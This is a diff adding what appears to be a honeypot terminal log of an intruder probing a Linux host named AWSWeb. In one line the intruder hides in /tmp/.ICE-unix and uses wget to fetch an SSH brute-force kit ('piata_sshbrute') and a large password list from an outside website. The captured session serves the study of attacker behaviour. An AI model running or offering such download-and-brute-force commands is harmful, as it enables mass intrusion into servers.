@@ -1,0 +1,72 @@
+[4hAWSWeb:~# history
+[4l    1  history
+[4hAWSWeb:~# perl
+bash: perl: command not found
+AWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# yum
+bash: yum: command not found
+AWSWeb:~# apt-get
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:~# apt-get install perl
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  perl 
+0 upgraded, 1 newly installed, 0 to remove and 259 not upgraded.
+Need to get 136.2kB of archives.
+After this operation, 299.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main perl 1.19-10 [136.2kB]
+Fetched 136.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking perl (from .../archives/perl_1.19-10_i386.deb) ...
+Processing triggers for man-db ...
+Setting up perl (1.19-10) ...
+[4hAWSWeb:~# perl
+[4lperl: Segmentation fault
+[4hAWSWeb:~# wget
+[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+[4hAWSWeb:~# cd /tmp; mkdir .ICE-unix; cd .ICE-unix; wget www.joepearce.com/sql/pc/piata_sshbrute.tar.gz; tar xvf piata_sshbrute.tar.gz; cd piata; rm -rf pass_file; wget www.joepearce.com/sql/pc/pass_file; chmod +x *
+[4l[4h[4lmkdir: cannot create directory `/tmp/.ICE-unix': File exists
+[4h[4l[4h[4l--2013-03-31 16:03:17--  http://www.joepearce.com/sql/pc/piata_sshbrute.tar.gz
+Connecting to www.joepearce.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 600966 (586K) [application/x-gzip]
+Saving to: `piata_sshbrute.tar.gz
+
+ 0% [>                                      ] 5,538        28K/s  eta 20s100%[======================================>] 600,966      28K/s
+
+2013-03-31 16:03:18 (28 KB/s) - `piata_sshbrute.tar.gz' saved [600966/600966]
+[4h[4lpiata
+piata/pass_file
+piata/pass_file.old
+piata/gen-pass.sh
+piata/mass
+piata/go.sh
+piata/ssh-scan
+piata/auto
+piata/a
+piata/ss
+piata/pscan2
+[4h[4l[4h[4l[4h[4l--2013-03-31 16:03:18--  http://www.joepearce.com/sql/pc/pass_file
+Connecting to www.joepearce.com:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 14409185 (13M) [text/plain]
+Saving to: `pass_file
+
+ 0% [>                                      ] 11,335       99K/s  eta 2m 25s 4% [=>                                     ] 716,511      1129K/s  eta 12s 22% [========>                              ] 3,301,191    2901K/s  eta 3s 49% [===================>                   ] 7,076,127    4297K/s  eta 1s75% [=============================>         ] 10,849,615   5049K/s  eta 0s100%[======================================>] 14,409,185   5049K/s
+
+2013-03-31 16:03:20 (5049 KB/s) - `pass_file' saved [14409185/14409185]
+[4h[4l[4hAWSWeb:/tmp/.ICE-unix/piata# ./pscan2
+[4lerror while loading shared libraries: libgnome.so.32: cannot open shared object file: No such file or directory
+[4hAWSWeb:/tmp/.ICE-unix/piata# apt-get provides libgnome.so.32
+[4lE: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
+E: Unable to lock the list directory
+[4hAWSWeb:/tmp/.ICE-unix/piata# 
